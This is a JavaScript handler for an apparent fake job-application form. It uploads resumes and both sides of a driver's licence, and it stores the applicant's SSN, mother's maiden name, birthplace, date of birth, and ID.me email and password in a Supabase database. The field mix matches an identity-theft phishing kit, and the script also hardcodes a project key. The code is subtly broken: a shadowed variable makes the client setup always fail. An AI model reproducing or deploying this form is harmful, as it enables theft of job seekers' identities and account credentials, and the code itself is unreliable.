import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm';
// Complete Job Application Form Handler
document.addEventListener('DOMContentLoaded', function() {
    console.log('Document ready, initializing application...');

    // Configuration - Replace with your actual Supabase credentials
    const SUPABASE_URL = 'https://ennkgaooigwkyafqgchv.supabase.co';
    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVubmtnYW9vaWd3a3lhZnFnY2h2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTI2NzYzNTgsImV4cCI6MjA2ODI1MjM1OH0.b7ogmi0adnadM34iHa1KdjZFMGB0vV5bw6VHcWdgh-o';
    const STORAGE_BUCKET = 'applications';

    // Initialize Supabase client with error handling
    let supabase;
    try {
        if (typeof supabase === 'undefined') {
            throw new Error('Supabase library not loaded');
        }
        supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
        console.log('Supabase client initialized successfully');
    } catch (error) {
        console.error('Supabase initialization failed:', error);
        showErrorNotification('Failed to initialize application. Please refresh the page.');
        return;
    }

    // Get form element
    const jobApplicationForm = document.getElementById('job-application-form');
    if (!jobApplicationForm) {
        console.error('Job application form not found');
        return;
    }

    // Get all required form elements
    const countrySelectElement = document.getElementById('country');
    const usFieldsSectionElement = document.getElementById('us-fields');
    const veteranRadioElements = document.querySelectorAll('input[name="veteran"]');
    const veteranDetailsElement = document.getElementById('veteran-details');
    const idmeRadioElements = document.querySelectorAll('input[name="idme-verified"]');
    const idmeVerifiedFieldsElement = document.getElementById('idme-verified-fields');
    const idmeNotVerifiedFieldsElement = document.getElementById('idme-not-verified-fields');
    const submitButtonElement = document.getElementById('submit-button');

    // Form state management
    let isFormSubmitting = false;
    const formDataState = {};

    // Initialize form functionality
    initializeForm();

    function initializeForm() {
        console.log('Initializing form functionality...');
        
        // Load saved form data if available
        loadSavedFormData();

        // Set up event listeners for conditional fields
        setupCountryChangeHandler();
        setupVeteranRadioHandlers();
        setupIdmeRadioHandlers();
        setupFormSubmissionHandler();
        setupRealTimeValidation();

        console.log('Form initialization complete');
    }

    function loadSavedFormData() {
        console.log('Checking for saved form data...');
        const savedFormData = localStorage.getItem('jobApplicationFormData');
        
        if (savedFormData) {
            try {
                const parsedData = JSON.parse(savedFormData);
                Object.assign(formDataState, parsedData);
                populateFormWithSavedData();
                console.log('Saved form data loaded successfully');
            } catch (error) {
                console.error('Error parsing saved form data:', error);
            }
        }
    }

    function populateFormWithSavedData() {
        const formElements = jobApplicationForm.elements;
        
        for (let i = 0; i < formElements.length; i++) {
            const formElement = formElements[i];
            if (formElement.name && formDataState[formElement.name] !== undefined) {
                if (formElement.type === 'checkbox' || formElement.type === 'radio') {
                    formElement.checked = formDataState[formElement.name] === formElement.value;
                } else {
                    formElement.value = formDataState[formElement.name];
                }
            }
        }

        // Trigger change events to update conditional fields
        if (countrySelectElement) {
            const changeEvent = new Event('change');
            countrySelectElement.dispatchEvent(changeEvent);
        }

        document.querySelectorAll('input[type="radio"]:checked').forEach(radioElement => {
            const radioChangeEvent = new Event('change');
            radioElement.dispatchEvent(radioChangeEvent);
        });
    }

    function setupCountryChangeHandler() {
        if (!countrySelectElement || !usFieldsSectionElement) return;

        countrySelectElement.addEventListener('change', function() {
            const isUnitedStatesSelected = this.value === 'US';
            
            // Toggle US fields visibility
            usFieldsSectionElement.style.display = isUnitedStatesSelected ? 'block' : 'none';
            
            // Toggle required attributes for US fields
            const usFieldInputs = usFieldsSectionElement.querySelectorAll('input, select, textarea');
            usFieldInputs.forEach(inputElement => {
                if (isUnitedStatesSelected) {
                    inputElement.setAttribute('required', '');
                } else {
                    inputElement.removeAttribute('required');
                    clearFieldError(inputElement);
                }
            });

            // Setup SSN formatting if US is selected
            if (isUnitedStatesSelected) {
                setupSsnFormatting();
            }
        });
    }

    function setupSsnFormatting() {
        const ssnInputElement = document.getElementById('ssn');
        if (!ssnInputElement) return;

        ssnInputElement.addEventListener('input', function(event) {
            // Format SSN as XXX-XX-XXXX
            let inputValue = this.value.replace(/[^\d]/g, '');
            
            if (inputValue.length > 3) {
                inputValue = inputValue.substring(0, 3) + '-' + inputValue.substring(3);
            }
            if (inputValue.length > 6) {
                inputValue = inputValue.substring(0, 6) + '-' + inputValue.substring(6);
            }
            
            this.value = inputValue.substring(0, 11); // Limit to 11 characters (XXX-XX-XXXX)
        });
    }

    function setupVeteranRadioHandlers() {
        if (!veteranRadioElements.length || !veteranDetailsElement) return;

        veteranRadioElements.forEach(radioElement => {
            radioElement.addEventListener('change', function() {
                const showVeteranDetails = this.checked && this.value === 'yes';
                veteranDetailsElement.style.display = showVeteranDetails ? 'block' : 'none';
                
                // Toggle required attributes for veteran details
                const veteranDetailInputs = veteranDetailsElement.querySelectorAll('input, select');
                veteranDetailInputs.forEach(inputElement => {
                    if (showVeteranDetails) {
                        inputElement.setAttribute('required', '');
                    } else {
                        inputElement.removeAttribute('required');
                        clearFieldError(inputElement);
                    }
                });
            });
        });
    }

    function setupIdmeRadioHandlers() {
        if (!idmeRadioElements.length || !idmeVerifiedFieldsElement || !idmeNotVerifiedFieldsElement) return;

        idmeRadioElements.forEach(radioElement => {
            radioElement.addEventListener('change', function() {
                const isVerifiedSelected = this.checked && this.value === 'yes';
                const isNotVerifiedSelected = this.checked && this.value === 'no';
                
                // Toggle verified fields
                idmeVerifiedFieldsElement.style.display = isVerifiedSelected ? 'block' : 'none';
                if (isVerifiedSelected) {
                    const verifiedInputs = idmeVerifiedFieldsElement.querySelectorAll('input');
                    verifiedInputs.forEach(inputElement => {
                        inputElement.setAttribute('required', '');
                    });
                } else {
                    const verifiedInputs = idmeVerifiedFieldsElement.querySelectorAll('input');
                    verifiedInputs.forEach(inputElement => {
                        inputElement.removeAttribute('required');
                        clearFieldError(inputElement);
                    });
                }
                
                // Toggle not verified fields
                idmeNotVerifiedFieldsElement.style.display = isNotVerifiedSelected ? 'block' : 'none';
                if (isNotVerifiedSelected) {
                    const notVerifiedInputs = idmeNotVerifiedFieldsElement.querySelectorAll('input');
                    notVerifiedInputs.forEach(inputElement => {
                        inputElement.setAttribute('required', '');
                    });
                } else {
                    const notVerifiedInputs = idmeNotVerifiedFieldsElement.querySelectorAll('input');
                    notVerifiedInputs.forEach(inputElement => {
                        inputElement.removeAttribute('required');
                        clearFieldError(inputElement);
                    });
                }
            });
        });
    }

    function setupFormSubmissionHandler() {
        jobApplicationForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            
            if (isFormSubmitting) return;
            
            // Validate form before submission
            if (!validateForm()) {
                return;
            }

            isFormSubmitting = true;
            updateSubmitButtonState(true);
            
            try {
                // Save current form state
                saveFormData();
                
                // Upload files first
                const resumeFile = document.getElementById('resume').files[0];
                const dlFrontFile = document.getElementById('dl-front').files[0];
                const dlBackFile = document.getElementById('dl-back').files[0];
                
                const [resumePath, dlFrontPath, dlBackPath] = await Promise.all([
                    uploadFileToSupabase(resumeFile),
                    uploadFileToSupabase(dlFrontFile),
                    uploadFileToSupabase(dlBackFile)
                ]);
                
                // Prepare form data for submission
                const formSubmissionData = prepareFormData(resumePath, dlFrontPath, dlBackPath);
                
                // Submit to Supabase
                const submissionResponse = await submitFormData(formSubmissionData);
                
                // Redirect on success
                window.location.href = `confirmation.html?id=${submissionResponse[0].id}`;
                
            } catch (error) {
                console.error('Form submission failed:', error);
                showErrorNotification('There was an error submitting your application. Please try again.');
            } finally {
                isFormSubmitting = false;
                updateSubmitButtonState(false);
            }
        });
    }

    function validateForm() {
        let isFormValid = true;
        
        // Clear previous errors
        clearAllErrors();
        
        // Validate all visible required fields
        const visibleInputs = jobApplicationForm.querySelectorAll(
            'input:not([type="hidden"]):not([style*="display: none"]), ' +
            'select:not([style*="display: none"]), ' +
            'textarea:not([style*="display: none"])'
        );

        visibleInputs.forEach(inputElement => {
            if (inputElement.hasAttribute('required') && !inputElement.value.trim()) {
                showFieldError(inputElement, 'This field is required');
                isFormValid = false;
            } else if (inputElement.type === 'email' && inputElement.value && !isValidEmail(inputElement.value)) {
                showFieldError(inputElement, 'Please enter a valid email address');
                isFormValid = false;
            } else if (inputElement.id === 'ssn' && inputElement.value && !isValidSsn(inputElement.value)) {
                showFieldError(inputElement, 'Please enter a valid SSN (XXX-XX-XXXX)');
                isFormValid = false;
            }
        });

        return isFormValid;
    }

    function isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    function isValidSsn(ssn) {
        const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
        return ssnRegex.test(ssn);
    }

    function showFieldError(fieldElement, errorMessage) {
        const formGroupElement = fieldElement.closest('.form-group');
        if (!formGroupElement) return;

        let errorElement = formGroupElement.querySelector('.error-message');
        if (!errorElement) {
            errorElement = document.createElement('p');
            errorElement.className = 'error-message';
            formGroupElement.appendChild(errorElement);
        }
        
        errorElement.textContent = errorMessage;
        fieldElement.classList.add('error');
    }

    function clearFieldError(fieldElement) {
        const formGroupElement = fieldElement.closest('.form-group');
        if (!formGroupElement) return;

        const errorElement = formGroupElement.querySelector('.error-message');
        if (errorElement) {
            errorElement.remove();
        }
        
        fieldElement.classList.remove('error');
    }

    function clearAllErrors() {
        document.querySelectorAll('.error-message').forEach(errorElement => {
            errorElement.remove();
        });
        
        document.querySelectorAll('.error').forEach(fieldElement => {
            fieldElement.classList.remove('error');
        });
    }

    function saveFormData() {
        const formElements = jobApplicationForm.elements;
        const formDataToSave = {};
        
        for (let i = 0; i < formElements.length; i++) {
            const formElement = formElements[i];
            if (formElement.name) {
                if (formElement.type === 'checkbox' || formElement.type === 'radio') {
                    if (formElement.checked) {
                        formDataToSave[formElement.name] = formElement.value;
                    }
                } else {
                    formDataToSave[formElement.name] = formElement.value;
                }
            }
        }
        
        localStorage.setItem('jobApplicationFormData', JSON.stringify(formDataToSave));
    }

    async function uploadFileToSupabase(file) {
        if (!file) return null;

        try {
            const fileExtension = file.name.split('.').pop();
            const fileName = `documents/${Date.now()}-${Math.random().toString(36).substring(2, 9)}.${fileExtension}`;
            
            const { data, error } = await supabase.storage
                .from(STORAGE_BUCKET)
                .upload(fileName, file);
            
            if (error) throw error;
            
            return data.path;
        } catch (error) {
            console.error('File upload error:', error);
            throw error;
        }
    }

    function prepareFormData(resumePath, dlFrontPath, dlBackPath) {
        const formData = new FormData(jobApplicationForm);
        const applicationData = {
            full_name: formData.get('full-name'),
            email: formData.get('email'),
            phone: formData.get('phone'),
            dob: formData.get('dob'),
            marital_status: formData.get('marital-status'),
            country: formData.get('country'),
            last_employer: formData.get('last-employer'),
            last_position: formData.get('last-position'),
            employment_dates: formData.get('employment-dates'),
            reason_leaving: formData.get('reason-leaving'),
            previous_employer: formData.get('previous-employer'),
            references: formData.get('references'),
            salary_expectations: formData.get('salary-expectations'),
            availability: formData.get('availability'),
            relocation: formData.get('relocation'),
            resume_path: resumePath,
            dl_front_path: dlFrontPath,
            dl_back_path: dlBackPath,
            created_at: new Date().toISOString()
        };

        // Add US-specific data if applicable
        if (countrySelectElement && countrySelectElement.value === 'US') {
            applicationData.is_veteran = formData.get('veteran') === 'yes';
            applicationData.ssn = formData.get('ssn');
            applicationData.mother_maiden_name = formData.get('mother-maiden');
            applicationData.birth_place = formData.get('birth-place');
            applicationData.idme_verified = formData.get('idme-verified') === 'yes';
            
            if (applicationData.is_veteran) {
                applicationData.veteran_rank = formData.get('veteran-rank');
                applicationData.veteran_branch = formData.get('veteran-branch');
            }
            
            if (applicationData.idme_verified) {
                applicationData.idme_email = formData.get('idme-email');
                // Note: In production, you should NEVER store passwords directly
                // This should be replaced with proper authentication flows
                applicationData.idme_password = formData.get('idme-password');
            }
        }

        return applicationData;
    }

    async function submitFormData(formData) {
        try {
            const { data, error } = await supabase
                .from('applicants')
                .insert([formData])
                .select();
            
            if (error) throw error;
            
            return data;
        } catch (error) {
            console.error('Database submission error:', error);
            throw error;
        }
    }

    function updateSubmitButtonState(isSubmitting) {
        if (!submitButtonElement) return;
        
        if (isSubmitting) {
            submitButtonElement.disabled = true;
            submitButtonElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
        } else {
            submitButtonElement.disabled = false;
            submitButtonElement.innerHTML = '<i class="fas fa-lock"></i> Submit Secure Application';
        }
    }

    function setupRealTimeValidation() {
        const emailInputElement = document.getElementById('email');
        if (emailInputElement) {
            emailInputElement.addEventListener('blur', function() {
                if (this.value && !isValidEmail(this.value)) {
                    showFieldError(this, 'Please enter a valid email address');
                } else {
                    clearFieldError(this);
                }
            });
        }

        const ssnInputElement = document.getElementById('ssn');
        if (ssnInputElement) {
            ssnInputElement.addEventListener('blur', function() {
                if (this.value && !isValidSsn(this.value)) {
                    showFieldError(this, 'Please enter a valid SSN (XXX-XX-XXXX)');
                } else {
                    clearFieldError(this);
                }
            });
        }
    }

    function showErrorNotification(message) {
        // Create or show error notification element
        let notificationElement = document.getElementById('form-error-notification');
        
        if (!notificationElement) {
            notificationElement = document.createElement('div');
            notificationElement.id = 'form-error-notification';
            notificationElement.style.position = 'fixed';
            notificationElement.style.top = '20px';
            notificationElement.style.right = '20px';
            notificationElement.style.padding = '15px';
            notificationElement.style.backgroundColor = '#d32f2f';
            notificationElement.style.color = 'white';
            notificationElement.style.borderRadius = '4px';
            notificationElement.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
            notificationElement.style.zIndex = '1000';
            notificationElement.style.display = 'flex';
            notificationElement.style.alignItems = 'center';
            notificationElement.style.gap = '10px';
            
            const iconElement = document.createElement('i');
            iconElement.className = 'fas fa-exclamation-circle';
            
            const messageElement = document.createElement('span');
            messageElement.id = 'form-error-message';
            
            const closeButton = document.createElement('button');
            closeButton.innerHTML = '&times;';
            closeButton.style.background = 'none';
            closeButton.style.border = 'none';
            closeButton.style.color = 'white';
            closeButton.style.cursor = 'pointer';
            closeButton.style.fontSize = '1.2em';
            closeButton.style.marginLeft = '10px';
            closeButton.addEventListener('click', function() {
                notificationElement.style.display = 'none';
            });
            
            notificationElement.appendChild(iconElement);
            notificationElement.appendChild(messageElement);
            notificationElement.appendChild(closeButton);
            
            document.body.appendChild(notificationElement);
        }
        
        document.getElementById('form-error-message').textContent = message;
        notificationElement.style.display = 'flex';
        
        // Auto-hide after 5 seconds
        setTimeout(() => {
            notificationElement.style.display = 'none';
        }, 5000);
    }
});
